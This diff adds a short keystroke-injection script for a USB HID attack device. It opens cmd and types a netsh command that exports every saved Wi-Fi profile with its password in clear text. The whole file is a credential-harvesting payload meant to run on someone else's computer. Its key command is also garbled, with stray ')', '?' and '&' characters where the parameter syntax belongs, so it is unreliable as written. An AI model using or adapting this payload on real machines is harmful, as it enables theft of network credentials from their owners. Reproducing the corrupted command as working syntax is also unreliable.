@@ -1,0 +1,19 @@
+REM This program will find the network keys stored on the computer.
+
+REM 1) Opens the cmd console.
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+
+REM 2) Types the commands.
+STRING echo off
+DELAY 200
+ENTER
+STRING netsh wlan export profiles folder)&Network?Keys& key)clear
+DELAY 200
+ENTER
+STRING exit
+DELAY 200
+ENTER
